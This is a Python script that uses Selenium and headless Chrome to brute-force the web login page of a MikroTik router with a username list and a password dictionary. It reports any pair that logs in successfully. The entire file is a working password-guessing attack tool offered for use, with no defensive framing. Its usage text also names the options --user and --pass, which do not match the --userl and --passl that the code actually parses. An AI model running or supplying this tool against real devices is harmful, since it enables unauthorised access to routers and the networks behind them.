# Importing modules
import sys 
import requests 
import selenium
import time
import chromedriver_binary
from selenium import webdriver 
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from optparse import OptionParser

# Fancy colors
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[0m'


# Arguments
usage = 'usage: %prog --site "http://172.16.16.1:8081" --user userlist.txt --pass passlist.txt'
parser = OptionParser(usage=usage) # Shorten the argument parser function
parser.add_option("--site", dest="url", help="MikroTik web login address") # Argument for the target login page
parser.add_option("--userl", dest="userlist", help="Target user list to attack") # Argument for the target username to be attacked
parser.add_option("--passl", dest="passlist", help="Password dictionary") # Arguments for the location of the password dictionary file
(options, args) = parser.parse_args() # Parse the arguments given by the user


# brute-force function
def bf(website, userlist, passlist):
	try: 
		g = open(userlist, 'r')
	except FileNotFoundError: 
		print(color.RED + '\n[!] '+color.WHITE + 'User list not found')
		exit(1)
	try: 
		f = open(passlist, 'r')
	except FileNotFoundError: 
		print(color.RED + '\n[!] '+color.WHITE + 'Password list not found')
		exit(1)
	chrome_options = webdriver.ChromeOptions()
	chrome_options.add_argument("--disable-popup-blocking")
	chrome_options.add_argument("--disable-extensions")
	chrome_options.add_argument("--headless")
	chrome_options.add_argument("--log-level=2")
	try: 
		browser = webdriver.Chrome(options=chrome_options)
		browser.implicitly_wait(2)
	except Exception as e:
		print('\n')
		print(e)
		exit(1)
	try: 
		for username in g:
		    user = username.rstrip('\n')
		    f.seek(0)
		    offset = 0
		    failed = 0
		    for password in f: 
		        pwd = password.rstrip('\n')
		        if failed != 1: 
		            browser.get(website) 
		            browser.find_element(By.CSS_SELECTOR, value='#name').clear()
		            browser.find_element(By.CSS_SELECTOR, value='#name').send_keys(user) 
		            browser.find_element(By.CSS_SELECTOR, value='#password').send_keys(pwd + Keys.ENTER) 
		        time.sleep(1)
		        try:
		            if browser.find_element(By.CSS_SELECTOR, value='#startup'):
		                try:
		                    if browser.find_element(By.CSS_SELECTOR, value='#id_Logout'):
		                        print(color.GREEN + '\n[#] ' + color.WHITE + 'Password found: ' + color.CYAN + user + ':' + pwd)
		                        exit(0)
		                except selenium.common.exceptions.NoSuchElementException:
		                    failed = 1
		                    f.seek(offset)
		                    print(color.RED + 'Failed: ' + color.WHITE + user + ':' + pwd)
		                    continue
		        except selenium.common.exceptions.NoSuchElementException:
		            failed = 0
		            offset += len(password)
		            print(color.GREEN + 'Tried: ' + color.WHITE + user + ':' + pwd)
		            continue
		        
		print(color.RED + '\n[!] '+color.WHITE + 'Sorry, password could not be found')
	except KeyboardInterrupt: 
		print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
		exit(0)


# Tests to check if the arguments are valid
missing_args = ""
if options.url == None:
    missing_args += "--site "
if options.userlist == None:
    missing_args += "--userl "
if options.passlist == None:
    missing_args += "--passl"
if missing_args != "": 
    print(color.RED + '\n[!] '+color.WHITE + 'Missing arguments: ' + missing_args)
else: 
    sys.stdout.write(color.GREEN + '[#] ' + color.WHITE + 'Checking if site is accessible ')
    sys.stdout.flush()
    try: 
        request = requests.get(options.url) 
        if request.status_code == 200: 
            print(color.GREEN + '[OK]\n'+color.WHITE)
        else: 
            print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Could not connect to ' + options.url)
            exit(1)
    except KeyboardInterrupt: 
        print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
        exit(0)
    except Exception as e:
    	print('\n')
    	print(e)
    	exit(1)
    bf(options.url, options.userlist, options.passlist) 
